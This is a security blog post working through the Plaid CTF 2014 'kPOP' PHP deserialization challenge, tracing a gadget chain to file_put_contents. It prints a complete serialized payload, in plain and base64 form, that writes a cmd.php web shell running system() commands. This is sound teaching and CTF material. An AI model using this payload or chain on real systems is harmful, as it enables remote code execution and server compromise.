---
layout:     post
title:      Exploring Deserialization Attacks and Their Effects
date: 2024-09-07 12:00
summary:    Uncover how deserialization attacks work with real-world example and learn how to mitigate their risks.
categories: security
---

Cheers!
<br />
I took a short break and returned with a new security post :relaxed:
<br /><br />
Let's discuss today on what Deserialization is and give a demonstration example, as it can sometimes can lead to Remote Code Execution (RCE), Privilege Escalation and additional weaknesses with severe impacts on the entire application.
<br /><br />
This time, I was digging deep inside the Internet and discovered a cool Deseralization challenge from '<a href="https://ctftime.org/event/119">Plaid CTF 2014</a>' called 'the kPOP challenge' which will help us better understand this vulnerability in this blog post.
<br /><br />
__Note:__ This challenge can be solved using two different approaches to achieve the same outcome. In this post, we chose to present one of them.
<br /><br />
The CTF source code files can be downloaded directly from <a href="https://github.com/pwning/plaidctf2014/tree/master/web/kPOP">plaidctf2014 </a> Github repo.

<p align="center">
  <img src="{{ site.url }}/images/i_dunno_what_to_choose.jpeg" alt="i_dunno_what_to_choose" />
</p>

<br />
Let's get started –
<br /><br />
Applications, in general, often rely on handling serialized data to function correctly. It's crucial to examine how this data is deserialized to ensure it's done safely. As attackers or researchers, we focus on instances where data is deserialized without proper validation or where serialized input is directly trusted. These deserialization opportunities, known as `sinks` can occur in a specific functions like `unserialize()` and `serialize()` that depend on user-provided input.
<br /><br />
Once we understand what we're looking for, let's take a closer look at the application's source code:
<br /><br />
The first step is to identify the PHP classes used within the application and examine their relationships and interactions. This can be easily done by using the `CTRL+SHIFT+F` shortcut in Visual Studio Code:
<br />
<p align="center">
  <img src="{{ site.url }}/images/vscode_classes_list.png" alt="vscode_classes_list" />
</p>

In order to better understand the relationships between kPOP classes in a more visual way, we can create a UML diagram based on the above class properties using PlantUML Editor[^1]. This diagram represents the system's structure and design, illustrating the various classes and their relationships, including inheritance, associations, and dependencies:
<br />

<p align="center">
  <img src="{{ site.url }}/images/kpop_uml.png" alt="kpop_uml" />
</p>
<p align="center">kPOP UML Diagram</p>

<br />
Once we have a basic understanding of the class relations, let's focus on the relevant `sinks` that handle serialization based on user-supplied input.
<br />
Using the same method in VSCode, let's search for all occurrences of the `unserialize` function in the code:
<br /><br />

<p align="center">
  <img src="{{ site.url }}/images/unserialize_function.png" alt="unserialize_function" />
</p>
The search results reveal three different occurrences, spread across two files:
* classes.php
* import.php

We can see that some occurrences of `serialize` depend on SQL return results (e.g., $row[0]), which are not influenced by user input. However, the other instances appear to be more promising for us.
<br /><br />
We will focus on the `import.php` file:
<br />
<p align="center">
  <img src="{{ site.url }}/images/unserialize_import_php.png" alt="unserialize_import_php" />
</p>
Which appears like this in the browser UI:
<p align="center">
  <img src="{{ site.url }}/images/import_php_file.png" alt="import_php_file" />
</p>
<p align="center">http://127.0.0.1/kPOP/import.php</p>
<br />
Class objects are immediately get deserialized once an `unserialize` call is triggered. We can exploit line 5 in the image above to inject our malicious class object, which will be demonstrated later in this article.
<br /><br />
At this stage, we have an injection entry point that depends on the provided `$_POST['data']` parameter and get serialized. Let's now take a closer look at the class declarations themselves.

When examining the code, the function that immediately caught my eye on is `file_put_contents` within the `writeLog` function, located in the `LogWriter_File` class inside `classes.php` file:

<p align="center">
  <img src="{{ site.url }}/images/logwriter_file_put_contents.png" alt="logwriter_file_put_contents" />
</p>
<p align="center">LogWriter_File declaration</p>

To better understand its usage, I referred to the `PHP.net` documentation page:

<p align="center">
  <img src="{{ site.url }}/images/file_put_contents_php.png" alt="file_put_contents_php" />
</p>
<p align="center">PHP.net Manual</p>

This function can be our <ins>first primitive</ins> for finding a way to write a malicious file on the web server's filesystem, which could serve as a web shell backdoor for executing shell commands!
<br /><br />
So, if we can control the filename written to disk (e.g., `cmd.php`) and its contents, we can write PHP code such as `system()` function to execute any command that we want.

We need to keep this in mind as we piece together the relationships between all the other classes, much like solving a puzzle, to successfully navigate this path and create our final malicious class object 😈

<br />
Let's continue on. In order to control the written filename, we need to identify which class holds this filename as a variable and gain control over it in our class object. This is illustrated in the following image:

<p align="center">
  <img src="{{ site.url }}/images/logwriter_file_filename.png" alt="logwriter_file_filename" />
</p>
<p align="center">Song class contains LogWriter_File object instance</p>

LogWriter_File is the relevant class. In the class declaration, we can see that the `$filename` variable is set to our desired file name within the LogWriter_File constructor (refer to the 'LogWriter_File Declaration' picture).

In the same image, we can also see that the content of the file is stored in the `$txt` parameter within the `writeLog` function of the LogWriter_File class.
<br />
The `$txt` content is controlled by executing the `log()` function within the Song class, which consists of a concatenation of the `name` and `group` properties of the Song class.

To control both the filename and content of the file using the `file_put_contents` function, we need to follow the class calling orders and determine where and by whom the `writeLog` function is invoked.

Let's illustrate this in the following picture:

<p align="center">
  <img src="{{ site.url }}/images/flow_write_diagram.png" alt="flow_write_diagram" />
</p>
<p align="center">Classes calling order</p>

We can see that the `Song` class is the one that initiates the entire class calling sequence to our desired `file_put_contents` function.

<br />
<ins>To summarize what we’ve covered so far:</ins>
  1. We need to exploit the `file_put_contents` functionality to write a webshell.
  2. We need to initialize the `$filename` variable under the LogWriter_File class with a value of `cmd.php`.
  3. We need to insert our malicious PHP code as a content to the `cmd.php` file triggered by the `writeLog` function.
  4. Finally, we need to invoke the correct sequence order of classes in our final payload, as shown above.

<p align="center">
  <img src="{{ site.url }}/images/all_the_magic_happens.jpg" alt="all_the_magic_happens" />
</p>

Let's put all the pieces together to create the payload as a one big serialized object:

`O:6:"Lyrics":2:{s:9:"*lyrics";s:12:"shell_lyrics";s:7:"*song";O:4:"Song":4:{s:9:"*logger";O:6:"Logger":1:{s:12:"*logwriter";O:14:"LogWriter_File":2:{s:11:"*filename";s:7:"cmd.php";s:9:"*format";O:13:"LogFileFormat":2:{s:10:"*filters";a:1:{i:0;O:12:"OutputFilter":2:{s:15:"*matchPattern";s:19:"/\[i\](.*)\[\/i\]/i";s:14:"*replacement";s:9:"<i>\1</i>";}}s:7:"*endl";s:1:"
";}}}s:7:"*name";s:35:"<?php system('ls -l; cat flag'); ?>";s:8:"*group";s:11:"shell_group";s:6:"*url";s:19:"https:\/\/shell.com";}}`

Take note of the line `s:11:"*filename";s:7:"cmd.php";` which represents our malicious filename with a `.php` extension, and the line `s:7:"*name";s:35:"<?php system('ls -l; cat flag'); ?>";` which represents our PHP `system()` function to execute shell commands.

<br />
The final serialized payload to be injected as a HTTP POST parameter in base64 format wil follow:

`Tzo2OiJMeXJpY3MiOjI6e3M6OToiACoAbHlyaWNzIjtzOjEyOiJzaGVsbF9seXJpY3MiO3M6`
<br />
`NzoiACoAc29uZyI7Tzo0OiJTb25nIjo0OntzOjk6IgAqAGxvZ2dlciI7Tzo2OiJMb2dnZXIi`
<br />
`OjE6e3M6MTI6IgAqAGxvZ3dyaXRlciI7TzoxNDoiTG9nV3JpdGVyX0ZpbGUiOjI6e3M6MTE6`
<br />
`IgAqAGZpbGVuYW1lIjtzOjc6ImNtZC5waHAiO3M6OToiACoAZm9ybWF0IjtPOjEzOiJMb2dG`
<br />
`aWxlRm9ybWF0IjoyOntzOjEwOiIAKgBmaWx0ZXJzIjthOjE6e2k6MDtPOjEyOiJPdXRwdXRG`
<br />
`aWx0ZXIiOjI6e3M6MTU6IgAqAG1hdGNoUGF0dGVybiI7czoxOToiL1xbaVxdKC4qKVxbXC9p`
<br />
`XF0vaSI7czoxNDoiACoAcmVwbGFjZW1lbnQiO3M6OToiPGk+XDE8L2k+Ijt9fXM6NzoiACoA`
<br />
`ZW5kbCI7czoxOiIKIjt9fX1zOjc6IgAqAG5hbWUiO3M6MzU6Ijw/cGhwIHN5c3RlbSgnbHMg`
<br />
`LWw7IGNhdCBmbGFnJyk7ID8+IjtzOjg6IgAqAGdyb3VwIjtzOjExOiJzaGVsbF9ncm91cCI7`
<br />
`czo2OiIAKgB1cmwiO3M6MTk6Imh0dHBzOlwvXC9zaGVsbC5jb20iO319`


We can use the Online PHP Unserializer[^2] to visualize the encoded payload in a Class Object hierarchy:
<br />

<p align="center">
  <img src="{{ site.url }}/images/unserialize_poc.png" alt="unserialize_poc" />
</p>
<p align="center">PHP Class Object representation</p>
<br />
And finally, gentlemen, music please — it's time to execute our malicious serialized payload on the `import.php` page!

<p align="center">
  <img src="{{ site.url }}/images/import_final_payload.png" alt="import_final_payload" />
</p>

We've captured the challenge flag and executed the `ls -l` command!

<p align="center">
  <img src="{{ site.url }}/images/challenge_flag.png" alt="challenge_flag" />
</p>

### Conclusion

Deserialization vulnerabilities have quite high entry barrier and require strong programming and research skills, making them as one of the most difficult vulnerabilities to identify in web applications. However, they have the most impactful severities once discovered.

I challenge you to keep looking after these vulnerabilities and not give up!

<p align="center">
  <img src="{{ site.url }}/images/deserialization_was_easy.jpeg" alt="deserialization_was_easy" />
</p>
<br />
Thanks for reading!

<br />
__Disclaimer:__ This material is for informational purposes only, and should not be construed as legal advice or opinion. For actual legal advice, you should consult with professional legal services.

---

[^1]: [PlantUML Online Editor](https://www.plantuml.com/)
[^2]: [Online PHP Unserializer](https://www.unserialize.com/)